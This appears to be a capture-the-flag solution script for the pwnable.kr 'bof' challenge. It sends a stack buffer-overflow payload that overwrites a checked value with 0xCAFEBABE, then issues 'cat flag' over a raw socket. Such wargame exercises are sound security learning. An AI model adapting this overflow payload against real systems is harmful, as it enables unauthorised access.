import socket


BYTES_ORDER = 'little'


def main():
    real_input = b'a' * 0x30
    saved_instruction_pointer = b'a' * 4
    overflow = 0xCAFEBABE.to_bytes(4, BYTES_ORDER)

    complete_input = real_input + saved_instruction_pointer + overflow + b'\n\n'

    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connection.connect(('pwnable.kr', 9000))

        print(complete_input)
        connection.send(complete_input)
        connection.send(b'cat flag\n')

        print(connection.recv(1024))
        print(connection.recv(1024))
    finally:
        connection.close()


if __name__ == '__main__':
    main()
